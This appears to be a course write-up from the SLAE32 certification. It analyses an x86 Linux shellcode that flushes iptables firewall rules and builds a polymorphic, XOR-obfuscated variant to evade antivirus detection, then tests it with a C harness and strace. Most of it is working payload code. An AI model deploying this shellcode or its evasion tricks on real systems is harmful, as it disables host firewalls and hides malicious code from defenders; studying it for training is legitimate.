Title: SLAE32 - Assignment 6.3
Date: 2022-06-04T14:31:50.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: PA-30398</p><h2 id="foreword">Foreword</h2><p>For this assignment, I chose the following shellcodes:</p><!--kg-card-begin: markdown--><ol>
<li><a href="http://shell-storm.org/shellcode/files/shellcode-812.php">Linux/x86 - chmod 666 /etc/passwd &amp; /etc/shadow - 57 bytes</a></li>
<li><a href="http://shell-storm.org/shellcode/files/shellcode-222.php">Linux/x86 - setuid(0) setgid(0) execve(echo 0 &gt; /proc/sys/kernel/randomize_va_space) - 79 bytes</a></li>
<li><a href="http://shell-storm.org/shellcode/files/shellcode-825.php">Linux/x86 - iptables --flush - 43 bytes</a></li>
</ol>
<!--kg-card-end: markdown--><p>In this part I'll create a polymorphic version of the 3rd shellcode.</p><h2 id="source-code">Source Code</h2><p>The files for this part of the assignment are the following:</p><!--kg-card-begin: markdown--><ul>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/original_shellcode.nasm">original_shellcode.nasm</a>, the original shellcode taken from Shell-Storm</li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/polymorphic_shellcode.nasm">polymorphic_shellcode.nasm</a>, my polymorphic version of the shellcode above</li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/test_polymorphic_shellcode.nasm">test_polymorphic_shellcode.nasm</a>, a <code>C</code> program for testing the polymorphic shellcode</li>
</ul>
<!--kg-card-end: markdown--><h2 id="analysis">Analysis</h2><p>First, we need to analyze the original shellcode:</p><pre><code class="language-bash">echo -ne "\x31\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x50\x56\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" &gt; shellcode.bin

ndisasm -b 32 -p intel shellcode.bin
</code></pre><p>Follows the output of <code>ndisasm</code>:</p><pre><code class="language-nasm">                            ; clear EAX, setting it to 0x00000000
00000000  31C0              xor eax,eax

                            ; null terminator for the string below
00000002  50                push eax

                            ; string -F
00000003  66682D46          push word 0x462d

                            ; save the pointer to the string into ESI
00000007  89E6              mov esi,esp

                            ; NULL terminator for the string below
00000009  50                push eax

                            ; string ///sbin/iptables
0000000A  68626C6573        push dword 0x73656c62
0000000F  6869707461        push dword 0x61747069
00000014  6862696E2F        push dword 0x2f6e6962
00000019  682F2F2F73        push dword 0x732f2f2f

                            ; save the pointer to the string into EBX
0000001E  89E3              mov ebx,esp

                            ; array of pointers to command-line arguments:
                            ;   - ebx -&gt; pointer to string '///sbin/iptables'
                            ;   - esi -&gt; pointer to string '-F'
                            ;   - eax -&gt; 0x00000000 (null terminator of the array)
00000020  50                push eax
00000021  56                push esi
00000022  53                push ebx
</code></pre><p>So far, the author of this shellcode pushed the string <code>///sbin/iptables</code> to the stack, saving its pointer into the register <code>EBX</code>, which is going be used by <code>execve</code> as the <strong>1st argument</strong> of <code>iptables</code>.</p><p>Follows the function prototype of <code>execve</code>:</p><pre><code class="language-cpp">int execve(
  // executable to run
  const char *pathname,

  // array of command-line arguments
  char *const argv[],

  // array of environment variables
  char *const envp[]
);
</code></pre><p>In this case <code>EBX</code> is <code>pathname</code>, i.e. a pointer to a string indicating the executable to run.</p><p>While <code>ECX</code> is a pointer to an array of pointers, terminated by the <code>DWORD</code> <code>0x00000000</code>.</p><p>On the stack, it would look like this:</p><pre><code class="language-nasm">; *ebx -&gt; '///sbin/iptables'
; *esi -&gt; '-F'
; 0x00000000
</code></pre><p>Follows the rest of the disassembly:</p><pre><code class="language-nasm">                            ; 2nd argument of execve:
                            ;   pointer to array of pointers to strings acting as
                            ;   command-line arguments of the program
00000023  89E1              mov ecx,esp

                            ; 3rd argument of execve:
                            ;   pointer to array of pointers to env. variables
00000025  89C2              mov edx,eax

                            ; call execve syscall
00000027  B00B              mov al,0xb
00000029  CD80              int 0x80
</code></pre><p>These instructions employ <code>execve</code> to run the command <code>///sbin/iptables -F</code>.</p><h2 id="polymorphic-shellcode">Polymorphic Shellcode</h2><p>Follows the polymorphic version of the shellcode:</p><pre><code class="language-nasm">; Title: Linux/x86 - iptables --flush
; Author: Robert C. Raducioiu
; Web: rbct.it
; Reference: http://shell-storm.org/shellcode/files/shellcode-825.php
; Shellcode: "\x31\xdb\xf7\xe3\x52\x66\xbf\x2d\x46\x66\x57\x89\xe7\x52\xbe\x74\x63\x62\x72\x52\x68\x62\x6c\x65\x73\x68\x1d\x13\x16\x13\x31\x34\x24\x68\x62\x69\x6e\x2f\x68\x5b\x4c\x4d\x01\x31\x34\x24\x89\xe3\x52\x57\x53\xb0\x0a\x40\x54\x59\xcd\x80"
; Length: 58 bytes

global _start

section .text

_start:

    ; clear EBX, EAX, and EDX
    xor ebx, ebx
    mul ebx
    
    ; instead of pushing EAX, push EDX
    push edx

    ; push word 0x462d
    ; instead of pushing the WORD 0x462d, use two steps
    mov di, 0x462d
    push di

    ; use edi instead of esi
    mov edi,esp
    
    ; use EBX or EDX instead of EAX
    push edx

    ; XOR key ('rbct')
    mov esi, 0x72626374

    ; NULL DWORD acting as the string terminator for
    ;   the path of the executable
    push edx

    push 0x73656c62
    
    push 0x1316131d
    xor [esp], esi

    push 0x2f6e6962

    push 0x014d4c5b
    xor [esp], esi

    ; save the pointer to the string into EBX
    push esp
    pop ebx

    ; instead of 'push eax' use 'push edx', as they are both set to 0x0 
    push edx

    push edi
    push ebx

    mov al, 0xa
    inc eax

    ; use the PUSH-POP technique instead of the MOV instruction
    push esp
    pop ecx

    ; call execve
    int 0x80
</code></pre><p>Now let me describe the changes. First, I've changed the following instructions...</p><pre><code class="language-nasm">global _start

section .text

_start:

    xor eax,eax
    push eax
    push word 0x462d
    mov esi,esp
    push eax
</code></pre><p>...into this:</p><pre><code class="language-nasm">global _start

section .text

_start:

    ; clear EBX, EAX, and EDX
    xor ebx, ebx
    mul ebx
    
    ; instead of pushing EAX, push EDX
    push edx

    ; push word 0x462d
    ; instead of pushing the WORD 0x462d, use two steps
    mov di, 0x462d
    push di
</code></pre><p>Starting from the beginning, instead of clearing only the register <code>EAX</code>, I'm also clearing <code>EBX</code> and <code>EDX</code>.</p><p>Moreover, instead of using the instruction <code>push eax</code>, I'm using <code>push edx</code> in order to change the bytes of the instruction.</p><p>Next, instead of using the instruction <code>push 0x462d</code> I chose a two-steps approach, at the cost of adding more bytes to the shellcode.</p><p>In particular, I chose to use the <code>MOV</code> instruction to copy the <code>WORD</code> value <code>0x462d</code> into the 16-bits <code>DI</code> register, and then push it to the stack.</p><p>After that:</p><pre><code class="language-nasm">    ; use edi instead of esi
    mov edi, esp
  
    ; use EBX or EDX instead of EAX
    push edx
</code></pre><p>Instead of saving the pointer to the string <code>-F</code> into the register <code>ESI</code>, I'm using the register <code>EDI</code>, thus changing the bytes of the shellcode.</p><p>Next, I chose to use the instruction <code>push edx</code> instead of <code>push eax</code>, as both these registers are cleared, thus set to <code>0x00000000</code>.</p><p>Follows the next piece of assembly code to analyze:</p><pre><code class="language-nasm">    ; XOR key ('rbct')
    mov esi, 0x72626374

    ; NULL DWORD acting as the string terminator for
    ;   the path of the executable
    push edx

    push 0x73656c62
    
    push 0x1316131d
    xor [esp], esi

    push 0x2f6e6962

    push 0x014d4c5b
    xor [esp], esi
</code></pre><p>This one differs the most in my opinion, and it's also the reason behind the increment of <code>11 bytes</code> compared to the original shellcode.</p><p>Given the path of the executable is pushed to the stack in clear-text, an <code>AntiVirus</code> program could easily find it, and therefore flag the shellcode as malicious.</p><p>Therefore, I decided to make a compromise and <code>XOR</code> two of the most obvious <code>DWORD</code> values:</p><ul><li><code>0x61747069</code> -&gt; <code>ipta</code></li><li><code>0x732f2f2f</code> -&gt; <code>///s</code></li></ul><p>One could also <code>XOR</code> the other two <code>DWORD</code> values, based on how many bytes you can add to the shellcode.</p><p>In this case, the <code>XOR</code> key is the <code>DWORD</code> value <code>0x72626374</code> (string: <code>rbct</code>).</p><p>Follows the second-to-last piece of Assembly code:</p><pre><code class="language-nasm">    ; save the pointer to the string into EBX
    push esp
    pop ebx

    ; instead of 'push eax' use 'push edx', as they are both set to 0x0 
    push edx

    push edi
    push ebx
</code></pre><p>Starting from the top, I used the <code>PUSH-POP</code> technique, instead of the instruction <code>mov ebx, esp</code>, as it changes the resulting bytes, while using the same number of bytes.</p><p>Next, I've repeated what I've already done before: use <code>push edx</code> instead of <code>push eax</code>, because they are both set to <code>0x00000000</code>.</p><p>The instructions <code>push edi</code> and <code>push ebx</code> aren't too different from the original shellcode, I had to use the register <code>edi</code> because I've changed it previously, storing the pointer to the string <code>-F</code> into <code>EDI</code> instead of <code>ESI</code>.</p><p>Finally, it's time to analyze the last piece of Assembly code:</p><pre><code class="language-nasm">    mov al, 0xa
    inc eax

    ; use the PUSH-POP technique instead 'mov ecx, esp'
    push esp
    pop ecx

    ; call execve
    int 0x80
</code></pre><p>At the end of the original shellcode there's the instruction <code>mov al, 0xb</code>.</p><p>I chose to split it into two instructions (<code>mov al, 0xa</code> and <code>inc eax</code>), as it adds only one byte more compared to the original shellcode.</p><p>I also changed the position inside the shellcode: instead of placing the instructions at the end, I placed them before other instructions, in order to evade pattern matching.</p><p>Next, I replaced the instruction <code>mov ecx,esp</code> with two instructions, using the <code>PUSH-POP</code> technique.</p><p>Compared to the original shellcode, I didn't have to clear the register <code>EDX</code>, as it was already cleared from the start (by means of <code>mul ebx</code>).</p><p>The last instruction is identical to the one from the original shellcode.</p><h3 id="testing">Testing</h3><p>To test the polymorphic shellcode, I've used the following C program:</p><pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

unsigned char code[] = \
"\x31\xdb\xf7\xe3\x52\x66\xbf\x2d\x46\x66\x57\x89\xe7\x52\xbe\x74\x63\x62\x72\x52\x68\x62\x6c\x65\x73\x68\x1d\x13\x16\x13\x31\x34\x24\x68\x62\x69\x6e\x2f\x68\x5b\x4c\x4d\x01\x31\x34\x24\x54\x5b\x52\x57\x53\xb0\x0a\x40\x54\x59\xcd\x80";

main()
{
    printf("Shellcode length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}
</code></pre><p>To compile:</p><pre><code class="language-bash">gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
</code></pre><p>Once I've run it, I could confirm it executes <code>iptables -F</code> successfully:</p><pre><code class="language-bash">rbct@slae:~/exam/assignment_6/3$ sudo strace -e trace=execve ./test_polymorphic_shellcode 
# execve("./test_polymorphic_shellcode", ["./test_polymorphic_shellcode"], [/* 16 vars */]) = 0
# Shellcode length: 58
# execve("///sbin/iptables", ["///sbin/iptables", "-F"], [/* 0 vars */]) = 0

rbct@slae:~/exam/assignment_6/3$
</code></pre><p>As you can see, it confirms the length of the shellcode is <code>58 bytes</code>.</p><p>More important is the last <code>execve</code> syscall. It executed the command <code>///sbin/iptables -F</code> and returned <code>0</code>, meaning it succeeded.</p>